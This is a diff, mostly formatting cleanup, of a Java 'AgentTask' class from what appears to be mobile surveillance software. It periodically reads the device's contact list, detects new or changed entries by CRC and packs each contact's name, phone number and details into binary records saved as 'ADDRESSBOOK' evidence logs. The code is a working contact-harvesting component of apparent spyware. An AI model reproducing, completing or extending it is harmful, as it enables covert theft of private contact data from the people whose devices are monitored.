@@ -35,7 +35,7 @@ public class AgentTask extends AgentBase {
 	private PickContact contact;
 
 	Markup markup;
-	
+
 	HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)
 
 	public AgentTask() {
@@ -56,14 +56,16 @@ public class AgentTask extends AgentBase {
 		setDelay(200);
 
 		markup = new Markup(AgentType.AGENT_TASK);
-		boolean needSerialize = false;
-		
+		final boolean needSerialize = false;
+
 		// the markup exists, try to read it
 		if (markup.isMarkup()) {
 			try {
 				contacts = (HashMap<Long, Long>) markup.readMarkupSerializable();
-			} catch (IOException e) {
-				if(Cfg.DEBUG) Check.log( TAG + " Error (begin): cannot read markup");
+			} catch (final IOException e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Error (begin): cannot read markup");
+				}
 			}
 		}
 
@@ -78,48 +80,62 @@ public class AgentTask extends AgentBase {
 	 * serialize contacts in the markup
 	 */
 	private void serializeContacts() {
-		if(Cfg.DEBUG) Check.ensures(contacts != null, "null contacts");
-		
+		if (Cfg.DEBUG) {
+			Check.ensures(contacts != null, "null contacts");
+		}
+
 		try {
-			boolean ret = markup.writeMarkupSerializable(contacts);
-			if(Cfg.DEBUG) Check.ensures(ret,"cannot serialize");
-		} catch (IOException e) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error (serializeContacts): " + e);
+			final boolean ret = markup.writeMarkupSerializable(contacts);
+			if (Cfg.DEBUG) {
+				Check.ensures(ret, "cannot serialize");
+			}
+		} catch (final IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error (serializeContacts): " + e);
+			}
 		}
 	}
 
 	/**
-	 * Every once and then read the contactInfo, and check every change.
-	 * If something is new the contact is saved.
+	 * Every once and then read the contactInfo, and check every change. If
+	 * something is new the contact is saved.
 	 */
 	@Override
 	public void go() {
 		contact = new PickContact();
 
-		Date before = new Date();
-		List<Contact> list = contact.getContactInfo();
-		Date after = new Date();
-		if(Cfg.DEBUG) Check.log( TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000);
-		if(Cfg.DEBUG) Check.log( TAG + " (go): list size = " + list.size());
+		final Date before = new Date();
+		final List<Contact> list = contact.getContactInfo();
+		final Date after = new Date();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000);
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (go): list size = " + list.size());
+		}
 
-		ListIterator<Contact> iter = list.listIterator();
+		final ListIterator<Contact> iter = list.listIterator();
 
 		boolean needToSerialize = false;
-	
+
 		// for every Contact
 		while (iter.hasNext()) {
-			Contact c = iter.next();
+			final Contact c = iter.next();
 
 			// calculate the crc of the contact
-			byte[] packet = preparePacket(c);
-			//if(Cfg.DEBUG) Check.log( TAG + " (go): " + Utils.byteArrayToHex(packet));
-			Long crcOld = contacts.get(c.getId());
-			Long crcNew = Encryption.CRC32(packet);
-			//if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> " + crcNew);
+			final byte[] packet = preparePacket(c);
+			// if(Cfg.DEBUG) Check.log( TAG + " (go): " +
+			// Utils.byteArrayToHex(packet));
+			final Long crcOld = contacts.get(c.getId());
+			final Long crcNew = Encryption.CRC32(packet);
+			// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> " +
+			// crcNew);
 
 			// if does not match, save and serialize
 			if (!crcNew.equals(crcOld)) {
-				if(Cfg.DEBUG) Check.log( TAG + " (go): new contact. " + c);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (go): new contact. " + c);
+				}
 				contacts.put(c.getId(), crcNew);
 				saveEvidence(c);
 				needToSerialize = true;
@@ -128,58 +144,62 @@ public class AgentTask extends AgentBase {
 		}
 
 		if (needToSerialize) {
-			if(Cfg.DEBUG) Check.log( TAG + " (go): serialize contacts");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (go): serialize contacts");
+			}
 			serializeContacts();
 		}
 	}
 
-
 	/**
 	 * Save evidence
+	 * 
 	 * @param c
 	 */
 	private void saveEvidence(Contact c) {
 
-		byte[] packet = preparePacket(c);
+		final byte[] packet = preparePacket(c);
 		contacts.put(c.getId(), Encryption.CRC32(packet));
 
-		LogR log = new LogR(EvidenceType.ADDRESSBOOK);
+		final LogR log = new LogR(EvidenceType.ADDRESSBOOK);
 		log.write(packet);
 		log.close();
 	}
 
 	/**
 	 * Prepare the packet from the contact
+	 * 
 	 * @param c
 	 * @return
 	 */
 	private byte[] preparePacket(Contact c) {
-		UserInfo user = c.getUserInfo();
-		//List<EmailInfo> email = c.getEmailInfo();
-		//List<PostalAddressInfo> paInfo = c.getPaInfo();
-		List<PhoneInfo> phoneInfo = c.getPhoneInfo();
-		//List<ImInfo> imInfo = c.getImInfo();
-		//List<OrganizationInfo> orgInfo = c.getOrgInfo();
-		//List<WebsiteInfo> webInfo = c.getWebInfo();
-		long uid = user.getUserId();
-		String name = user.getCompleteName();
+		final UserInfo user = c.getUserInfo();
+		// List<EmailInfo> email = c.getEmailInfo();
+		// List<PostalAddressInfo> paInfo = c.getPaInfo();
+		final List<PhoneInfo> phoneInfo = c.getPhoneInfo();
+		// List<ImInfo> imInfo = c.getImInfo();
+		// List<OrganizationInfo> orgInfo = c.getOrgInfo();
+		// List<WebsiteInfo> webInfo = c.getWebInfo();
+		final long uid = user.getUserId();
+		final String name = user.getCompleteName();
 
 		final int version = 0x01000000;
 
 		final byte[] header = new byte[12];
 
-		ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-		String message = c.getInfo();
+		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+		final String message = c.getInfo();
 
 		addTypedString(outputStream, (byte) 0x01, name);
 		if (phoneInfo.size() > 0) {
-			String number = phoneInfo.get(0).getPhoneNumber();
+			final String number = phoneInfo.get(0).getPhoneNumber();
 			addTypedString(outputStream, (byte) 0x07, number);
 		}
 		addTypedString(outputStream, (byte) 0x37, message);
-		//if(Cfg.DEBUG) Check.log( TAG + " (preparePacket): " + uid + " " + name);
+		// if(Cfg.DEBUG) Check.log( TAG + " (preparePacket): " + uid + " " +
+		// name);
 
-		byte[] payload = outputStream.toByteArray();
+		final byte[] payload = outputStream.toByteArray();
 
 		final int size = payload.length + header.length;
 
@@ -189,24 +209,34 @@ public class AgentTask extends AgentBase {
 		db_header.writeInt(version);
 		db_header.writeInt((int) uid);
 
-		if(Cfg.DEBUG) Check.asserts(header.length == 12, "getContactPayload header.length: " + header.length);
-		if(Cfg.DEBUG) Check.asserts(db_header.getPosition() == 12, "getContactPayload db_header.getLength: " + header.length);
+		if (Cfg.DEBUG) {
+			Check.asserts(header.length == 12, "getContactPayload header.length: " + header.length);
+		}
+		if (Cfg.DEBUG) {
+			Check.asserts(db_header.getPosition() == 12, "getContactPayload db_header.getLength: " + header.length);
+		}
 
 		final byte[] packet = Utils.concat(header, 12, payload, payload.length);
-		if(Cfg.DEBUG) Check.ensures(packet.length == size, "getContactPayload packet.length: " + packet.length);
+		if (Cfg.DEBUG) {
+			Check.ensures(packet.length == size, "getContactPayload packet.length: " + packet.length);
+		}
 		return packet;
 	}
 
 	private void addTypedString(ByteArrayOutputStream outputStream, byte type, String name) {
 		if (name != null && name.length() > 0) {
 			final int header = (type << 24) | (name.length() * 2);
-			
+
 			try {
 				outputStream.write(Utils.intToByteArray(header));
 				outputStream.write(WChar.getBytes(name, false));
-			} catch (IOException e) {
-				if(Cfg.DEBUG) { Check.log(e); }
-				if(Cfg.DEBUG) Check.log( TAG + " Error (addTypedString): " + e);
+			} catch (final IOException e) {
+				if (Cfg.DEBUG) {
+					Check.log(e);
+				}
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Error (addTypedString): " + e);
+				}
 			}
 		}
 	}
